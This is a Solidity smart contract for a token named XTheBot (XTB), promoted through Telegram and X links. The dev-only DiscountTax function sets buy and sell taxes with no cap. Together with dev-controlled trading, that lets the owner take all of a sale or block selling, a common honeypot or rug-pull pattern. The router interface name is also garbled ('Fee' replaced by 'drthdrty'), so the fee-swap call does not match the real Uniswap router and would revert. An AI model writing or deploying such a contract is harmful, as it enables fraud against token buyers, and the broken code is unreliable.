/*

Telegram: https://t.me/XTheBotTeam
X: https://x.com/XTheBotTeam/
https://www.xthebot.com/

*/

// SPDX-License-Identifier: unlicense


pragma solidity 0.8.21;
    
interface IUniswapV2Router02 {
     function swapExactTokensForETHSupportingdrthdrtyOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}
    
    contract XTheBot {
        
        constructor() {
            balanceOf[msg.sender] = totalSupply;
            allowance[address(this)][routerAddress] = type(uint256).max;
            emit Transfer(address(0), msg.sender, totalSupply);
        }

        string public   name_ = "XTheBot"; 
        string public   symbol_ = "XTB";  
        uint8 public constant decimals = 18;
        uint256 public constant totalSupply = 10000000 * 10**decimals;

        uint256 buydrthdrty = 0;
        uint256 selldrthdrty = 0;
        uint256 constant swapAmount = totalSupply / 100;
        
        error Permissions();

        function name() public view virtual returns (string memory) {
        return name_;
        }

    
        function symbol() public view virtual returns (string memory) {
        return symbol_;
        }    

        event Transfer(address indexed from, address indexed to, uint256 value);
        event Approval(
            address indexed XTheBot_Dev,
            address indexed spender,
            uint256 value
        );

        mapping (address => uint256) public balanceOf;
        mapping (address => mapping (address => uint256)) public allowance;

       
        
        

        address private pair;
        address constant ETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address constant routerAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
        IUniswapV2Router02 constant _uniswapV2Router = IUniswapV2Router02(routerAddress);
        address payable constant XTheBot_Dev = payable(address(0x5A75137010ecDE25Af933383128d066BB468F844));

        bool private swapping;
        bool private tradingOpen;

        

        receive() external payable {}

        function approve(address spender, uint256 amount) external returns (bool){
            allowance[msg.sender][spender] = amount;
            emit Approval(msg.sender, spender, amount);
            return true;
        }

        function transfer(address to, uint256 amount) external returns (bool){
            return _transfer(msg.sender, to, amount);
        }

        function transferFrom(address from, address to, uint256 amount) external returns (bool){
            allowance[from][msg.sender] -= amount;        
            return _transfer(from, to, amount);
        }

        function _transfer(address from, address to, uint256 amount) internal returns (bool){
            require(tradingOpen || from == XTheBot_Dev || to == XTheBot_Dev);

            if(!tradingOpen && pair == address(0) && amount > 0)
                pair = to;

            balanceOf[from] -= amount;

            if (to == pair && !swapping && balanceOf[address(this)] >= swapAmount){
                swapping = true;
                address[] memory path = new  address[](2);
                path[0] = address(this);
                path[1] = ETH;
                _uniswapV2Router.swapExactTokensForETHSupportingdrthdrtyOnTransferTokens(
                    swapAmount,
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                XTheBot_Dev.transfer(address(this).balance);
                swapping = false;
            }

            if(from != address(this)){
                uint256 drthdrtyAmount = amount * (from == pair ? buydrthdrty : selldrthdrty) / 100;
                amount -= drthdrtyAmount;
                balanceOf[address(this)] += drthdrtyAmount;
            }
            balanceOf[to] += amount;
            emit Transfer(from, to, amount);
            return true;
        }

        function TradingOpen() external {
            require(msg.sender == XTheBot_Dev);
            require(!tradingOpen);
            tradingOpen = true;        
        }

        function _DiscountTax(uint256 _buy, uint256 _sell) private {
            buydrthdrty = _buy;
            selldrthdrty = _sell;
        }

        function DiscountTax(uint256 _buy, uint256 _sell) external {
            if(msg.sender != XTheBot_Dev)        
                revert Permissions();
            _DiscountTax(_buy, _sell);
        }
    }